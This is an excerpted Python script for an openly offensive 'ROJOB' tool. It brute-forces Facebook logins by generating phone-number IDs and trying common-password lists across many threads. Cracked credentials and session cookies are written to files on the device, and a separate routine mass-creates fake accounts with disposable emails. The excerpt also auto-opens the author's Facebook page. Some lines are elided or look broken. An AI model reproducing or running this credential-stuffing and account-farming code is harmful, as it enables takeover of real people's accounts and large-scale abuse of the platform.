...
▐▌ ▐▌▝▚▄▞▘▗▄▄▞▘▝▚▄▞▘▐▙▄▞▘
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mAuthor  : ROJOB ALI
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mGithub  : ROJOB-XD
...
def linex():
    print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
os.system('xdg-open https://www.facebook.com/rojobali72')
def clear():
        os.system('clear')
        print(logo)
A = '\x1b[1;97m' 
...
def menu():
            clear()
        #    linex()
            print('   \33[37;42m\t Welcome DOD xd ROJOB Tool\33[0;m');linex()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as ROJOB:     
                        clear()
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','malik123','kingkhan','123456','1234567','12345678','123456789','1234567890','012345678','112233','11223344','freefire','freefirelover','pubglover','i love pubg','gamingboy','jadid1234','moksidul123','rohan123','nayem123','pak123','khan123']
                                ROJOB.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def bd():
                ...
                with tred(max_workers=30) as ROJOB:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'i love you','iloveyou','123456','1234567','12345678','123456789','1234567890','012345678','112233','11223344','freefire','freefirelover','pubglover','i love pubg','gamingboy','jadid1234','moksidul123','rohan123','nayem123','free fire','freefire','57273200']
                                ROJOB.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [ROJOB-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [ROJOB-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/DOD/ROJOB-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [ROJOB-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/DOD/ROJOB-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/DOD/ROJOB-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [ROJOB-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/DOD/ROJOB-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/DOD/ROJOB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ROJOB-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [ROJOB-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/DOD/ROJOB-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Create():
    ...
    def sROJOB():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [ROJOB-CREATE] \033[1;32mOK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [ROJOB-OK] "+uid+'|'+pas+'|'+coki)
    ...
    for i in range(50000):
       import time
       time.sleep(2)
       tpe(max_workers=10).submit(sROJOB)
...
boy = ['Ali Khan', 'Rustam Khan', '123456','1234567','12345678','123456789','1234567890','012345678','112233','11223344','freefire','freefirelover','pubglover','i love pubg','gamingboy','Faisal Khan', 'Afzal Khan', 'Haider Khan', 'Suleman Khan', 'Nadeem Khan', 'Nazeer Malik', 'Nazeer Jutt', 'Nazeer Rehmani', 'Safdar Malik', 'Intzar Khan', 'Saleem Malik', 'Abdullah Malik', 'Naseer Jutt', 'Muzammil Malik', 'Fiaz Ahmad', 'Asghar Ali', 'Shabeer Ahmad', 'Irfan Ali', 'Ahmad Gujjar']
        ...
        for x in range(lim):
            ...
            try:
                ...
                if 'checkpoint' in getts.url:
                    ...
                    print ('\r\033[1;32m [ROJOB-OK] '+cok['c_user']+' | '+passw+'\033[0;97m     ')
                    open('/sdcard/DOD/ROJOB-CREATE.txt','a').write(cok['c_user']+' | '+passw+' \n')
                        ...
                        for x in BeautifulSoup(po.text, 'html.parser').find_all('form', {'method': 'post'}):
                            if 'confirmation_event_location=cliff' in str(x):
                                ...
                                if 'checkpoint' in rex.url:
                                    cok = self.ses.cookies.get_dict()
                                    cp.append(email+passw)
                                    print ('\r\033[1;32m[ROJOB-CP] '+cok['c_user']+' | '+passw+'\033[0;97m     ')
                                else:
